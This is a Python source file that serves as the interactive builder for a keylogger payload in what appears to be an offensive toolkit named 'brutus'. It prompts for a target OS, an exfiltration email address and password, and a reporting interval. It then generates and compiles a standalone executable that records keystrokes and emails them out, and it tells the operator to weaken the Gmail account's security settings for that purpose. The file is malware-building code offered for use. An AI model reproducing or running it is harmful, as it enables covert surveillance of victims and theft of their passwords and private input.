"""
Inquirer interface
"""
import inquirer  # type: ignore

from brutus.interfaces.utils.inquirer_utils import destructure
from brutus.models.CompilerFactory import CompilerFactory
from brutus.utils.log import Logger


def not_empty(_: dict, answer: str):
    """Ensure the string argument is non-empty"""
    return answer != ''


questions = [
    inquirer.List(
        name='target',
        message='Select the target OS',
        choices=[('Linux', 'linux'), ('Windows', 'windows'), ('MacOS', 'darwin')],
    ),
    # NOTE if you change the Reporter type,
    # you will need to change these arguments as well
    inquirer.Text(
        name='email',
        message='Enter email address to send reports to',
        validate=not_empty,
    ),
    inquirer.Text(
        name='password',
        message='Enter password for given email address',
        validate=not_empty,
    ),
    inquirer.Text(
        name='interval',
        message='Report interval (in seconds)',
        default=25000,
        validate=not_empty,
    ),
    inquirer.Text(name='filename', message='Enter output filename', validate=not_empty),
]


def run() -> None:
    """Run the Inquirer prompt
    TODO fix
    """
    answers = inquirer.prompt(questions, raise_keyboard_interrupt=True)

    target, email, password, interval, filename = destructure(
        answers, 'target', 'email', 'password', 'interval', 'filename'
    )

    compiler = CompilerFactory(filename='./keylogger.py')

    compiler.write_file_imports(
        lines=[
            'import Keylogger',
            f'keylogger = Keylogger.Keylogger(interval={interval},email=\'{email}\',password=\'{password}\')',  # noqa: E501 pylint: disable=C0301
            'keylogger.start()',
        ]
    )

    try:
        if target == 'windows':
            compiler.compile_for_windows(
                hidden_imports=[
                    'pynput',
                    'brutus',
                    'brutus.payloads',
                    'brutus.payloads.keylogger',
                    'brutus.payloads.keylogger.Keylogger',
                ]
            )
        else:
            compiler.compile_for_posix(
                hidden_imports=[
                    'pynput',
                    'brutus',
                    'brutus.payloads',
                    'brutus.payloads.keylogger',
                    'brutus.payloads.keylogger.Keylogger',
                ]
            )
        print('\n')
        Logger.success(f'successfully compiled to {filename}')
        Logger.info(
            'you must allow \'less secure applications\' in provided Gmail account'
        )
        Logger.info('do so here: https://myaccount.google.com/lesssecureapps')
    except KeyboardInterrupt:
        Logger.warn('terminated by user')
    except Exception:  # pylint: disable=W0703
        Logger.fail('compilation failed')
